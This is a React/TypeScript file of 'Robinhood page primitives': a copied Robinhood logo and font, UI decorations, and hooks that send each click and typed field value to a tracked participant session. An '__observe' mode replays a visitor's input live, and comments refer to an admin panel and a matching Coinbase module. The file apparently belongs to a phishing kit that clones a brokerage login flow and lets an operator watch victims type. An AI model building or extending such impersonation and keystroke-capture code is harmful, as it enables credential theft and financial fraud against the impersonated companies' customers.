// Shared Robinhood page primitives: logo, tracking hook, globe icon.
// Mirrors CbShared — maps `useVisitorTracking` onto `useParticipant` so admin
// panel keeps working with the RH design.

import { useEffect, useMemo } from "react";
import { useNavigate, useRouterState } from "@tanstack/react-router";
import { useParticipant } from "@/hooks/useParticipant";

export function RhLogo() {
  return (
    <svg viewBox="0 0 781.7 149.53" width="136" xmlns="http://www.w3.org/2000/svg" aria-label="Robinhood">
      <path fill="#fff" d="m275.4,52.23c-20.4,0-32.9,13.2-32.9,36.4s12.5,36.3,32.9,36.3,32.8-13.2,32.8-36.3-12.2-36.4-32.8-36.4Zm0,62.1c-12.9,0-18.1-10.6-18.1-25.6.1-15.2,5.2-25.7,18.1-25.7s18.1,10.5,18.1,25.6-5.2,25.7-18.1,25.7Z" />
      <path fill="#fff" d="m462.3,52.23c-10.1,0-16,4.6-20.4,10.5-.6.7-1.1,1.4-2.1,1.4s-1.8-.7-1.8-2.1v-8.4h-13.2v70h14v-38.6c0-12.5,6.7-21.4,17.2-21.4,9.9,0,14.8,5.7,14.8,18.1v41.9h14v-45.6c0-16.1-7.3-25.8-22.5-25.8Z" />
      <path fill="#fff" d="m537.1,52.23c-9.4,0-15.5,4.2-19.6,9.5-.6.7-1.1,1.4-2.1,1.4s-1.8-.7-1.8-2.1V23.43h-14v100.2h14v-38.6c0-12.5,6.7-21.4,17.2-21.4,9.9,0,14.8,5.7,14.8,18.1v41.9h14v-45.6c0-16.1-7.3-25.8-22.5-25.8Z" />
      <path fill="#fff" d="m603.3,52.23c-20.4,0-32.9,13.2-32.9,36.4s12.5,36.3,32.9,36.3,32.8-13.2,32.8-36.3c-.1-23.2-12.2-36.4-32.8-36.4Zm0,62.1c-12.9,0-18.1-10.6-18.1-25.6s5.2-25.6,18.1-25.6,18.1,10.5,18.1,25.6c-.1,14.9-5.2,25.6-18.1,25.6Z" />
      <path fill="#fff" d="m676.7,52.23c-20.4,0-32.9,13.2-32.9,36.4s12.5,36.3,32.9,36.3,32.8-13.2,32.8-36.3-12.2-36.4-32.8-36.4Zm0,62.1c-12.9,0-18.1-10.6-18.1-25.6s5.2-25.6,18.1-25.6,18.1,10.5,18.1,25.6-5.2,25.6-18.1,25.6Z" />
      <rect fill="#fff" height="70" width="14" x="395.6" y="53.63" />
      <rect fill="#fff" height="16" width="15" x="395" y="23.43" />
      <path fill="#fff" d="m767.7,23.43v35.8c0,1.4-.8,2.1-1.8,2.1-.7,0-1.7-.7-2.1-1.1-5-5.3-10.4-8-18.9-8-15.1,0-27.4,11.6-27.4,36.4s12.3,36.3,27.4,36.3c8.8,0,14.3-3.4,19.6-8.7.8-.8,1.4-1.3,2.1-1.3,1,0,1.8.7,1.8,2.1v6.6h13.3V23.43h-14Zm-17.5,90.8c-12.9.1-18.1-10.6-18.1-25.6s5.2-25.6,18.1-25.6,18.1,10.5,18.1,25.6-5,25.6-18.1,25.6Z" />
      <path fill="#fff" d="m356.6,52.23c-8.5,0-13.9,2.7-18.9,8-.4.4-1.4,1.1-2.1,1.1-1,0-1.8-.7-1.8-2.1V23.43h-14v100.2h13.2v-6.6c0-1.4.8-2.1,1.8-2.1.7,0,1.3.4,2.1,1.3,5.3,5.3,10.8,8.7,19.6,8.7,15.1,0,27.5-11.5,27.5-36.3s-12.3-36.4-27.4-36.4Zm-5.4,62.1c-13,0-18.1-10.6-18.1-25.6s5-25.6,18.1-25.6,18.1,10.5,18.1,25.6c0,14.9-5.2,25.6-18.1,25.6Z" />
      <path fill="#fff" d="m220.5,79.03c-1.1-.4-1.5-1.1-1.5-2,0-1,.4-1.4,1.7-2.1,7.6-3.6,12.2-10.8,12.2-20.6,0-17.2-10.8-27.6-32.5-27.6h-37.4v96.9h14.8v-40h23.9c11.3,0,15.1,4.8,15.4,12.6l1.4,27.4h14.6l-1.5-28.4c-.6-9.4-4.3-13.7-11.1-16.2Zm-21.1-6.9h-21.6v-33.6h21.6c11.2,0,18.1,5.5,18.1,16.8s-6.9,16.8-18.1,16.8Z" />
      <path fill="#fff" d="m73.96,33.73h-30.4c-1.1,0-2.03.44-2.8,1.4l-21.8,27c-3.2,4-4,7.7-4,13v27.6C7.86,122.63,3.36,136.13.06,148.33c-.2.78.1,1.2.8,1.2h3.3c.6,0,1.2-.3,1.4-.8C30.46,85.33,57.56,53.93,74.56,35.13c.7-.8.4-1.4-.6-1.4Z" />
      <path fill="#fff" d="m74.86,2.63c-2.04.79-4,2.13-4.9,2.9-9,7.7-15,13.8-20.7,19.8-.7.7-.4,1.4.6,1.4h33.7c3.1,0,4.9,1.8,4.9,4.9v38c0,1,.8,1.3,1.4.4l20.3-26.5c3.3-4.3,4.3-5.6,5.2-11.6,1.2-8.8.5-22.3-4.8-27.9-4.7-5-25.9-5.2-35.7-1.4Z" />
      <path fill="#fff" d="m79.96,41.33c-20.9,23.3-37.2,47.8-52.3,77.3-.38.74.1,1.4,1,1.1l31.2-9.6c3.52-1.08,5.5-2.5,7.2-5.3l13.9-22.9c.3-.6.4-1.3.4-1.8v-38.2c0-1-.7-1.4-1.4-.6Z" />
    </svg>
  );
}

export function GlobeIcon() {
  return (
    <svg fill="none" height="16" viewBox="0 0 16 16" width="16" xmlns="http://www.w3.org/2000/svg">
      <path d="M14.6666 8.00016C14.6666 11.6821 11.6818 14.6668 7.99992 14.6668M14.6666 8.00016C14.6666 4.31826 11.6818 1.3335 7.99992 1.3335M14.6666 8.00016H1.33325M7.99992 14.6668C4.31802 14.6668 1.33325 11.6821 1.33325 8.00016M7.99992 14.6668C9.66744 12.8413 10.6151 10.4721 10.6666 8.00016C10.6151 5.52819 9.66744 3.15906 7.99992 1.3335M7.99992 14.6668C6.3324 12.8413 5.38475 10.4721 5.33325 8.00016C5.38475 5.52819 6.3324 3.15906 7.99992 1.3335M1.33325 8.00016C1.33325 4.31826 4.31802 1.3335 7.99992 1.3335" stroke="currentColor" strokeLinecap="round" strokeLinejoin="round" strokeWidth="0.833333" />
    </svg>
  );
}

/** Fake "3D background" — simple animated gradient sphere (no three.js). */
export function Rh3DBackground() {
  return (
    <div
      style={{
        position: "absolute",
        inset: 0,
        overflow: "hidden",
        background:
          "radial-gradient(circle at 30% 40%, rgba(0,200,5,0.35), transparent 55%), radial-gradient(circle at 70% 70%, rgba(0,120,255,0.25), transparent 60%), #000",
      }}
    >
      <style>{`
        @keyframes rhOrbFloat { 0%,100% { transform: translate(0,0) scale(1);} 50% { transform: translate(20px,-30px) scale(1.05);} }
        @keyframes rhOrbFloat2 { 0%,100% { transform: translate(0,0) scale(1);} 50% { transform: translate(-30px,25px) scale(1.08);} }
      `}</style>
      <div style={{ position: "absolute", width: 380, height: 380, top: "20%", left: "15%", borderRadius: "50%", background: "radial-gradient(circle, rgba(0,200,5,0.55), transparent 70%)", filter: "blur(40px)", animation: "rhOrbFloat 9s ease-in-out infinite" }} />
      <div style={{ position: "absolute", width: 320, height: 320, bottom: "15%", right: "10%", borderRadius: "50%", background: "radial-gradient(circle, rgba(80,130,255,0.5), transparent 70%)", filter: "blur(50px)", animation: "rhOrbFloat2 11s ease-in-out infinite" }} />
    </div>
  );
}

export function useIsObserve(): boolean {
  return useMemo(() => {
    if (typeof window === "undefined") return false;
    try {
      return new URLSearchParams(window.location.search).get("__observe") === "1";
    } catch {
      return false;
    }
  }, []);
}

export function useRhQueryParam(name: string): string | null {
  const search = useRouterState({ select: (s) => s.location.search });
  return useMemo(() => {
    if (typeof window === "undefined") return null;
    try {
      const raw = typeof search === "string" ? search : window.location.search;
      return new URLSearchParams(raw.startsWith("?") ? raw.slice(1) : raw).get(name);
    } catch {
      return null;
    }
  }, [search, name]);
}

export function useRhTracking() {
  const isObserve = useIsObserve();
  const navigate = useNavigate();
  const { emitInput, participantId } = useParticipant();

  function trackClick(label: string) {
    if (isObserve) return;
    emitInput("__click", label);
  }
  function trackInput(field: string, value: string) {
    if (isObserve) return;
    emitInput(field, value);
  }
  function rhNavigate(to: string) {
    if (isObserve) return;
    try {
      window.postMessage({ __ux: true, type: "internal_navigation", url: to }, "*");
    } catch { /* ignore */ }
    navigate({ to, reloadDocument: false }).catch(() => {
      window.location.assign(to);
    });
  }

  useEffect(() => {
    if (!isObserve || typeof window === "undefined") return;
    function onMsg(e: MessageEvent) {
      const d = e.data;
      if (!d || typeof d !== "object" || d.__mirror !== true) return;
      if (d.type !== "live_input" || typeof d.field !== "string") return;
      const el = document.querySelector(`[name="${d.field}"]`) as HTMLInputElement | HTMLTextAreaElement | null;
      if (el) {
        el.value = String(d.value ?? "");
        el.dispatchEvent(new Event("input", { bubbles: true }));
      }
    }
    window.addEventListener("message", onMsg);
    return () => window.removeEventListener("message", onMsg);
  }, [isObserve]);

  return { sessionId: participantId, trackClick, trackInput, rhNavigate, isObserve };
}

export const RH_FONT_FAMILY =
  "'Capsule Sans Text', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif";
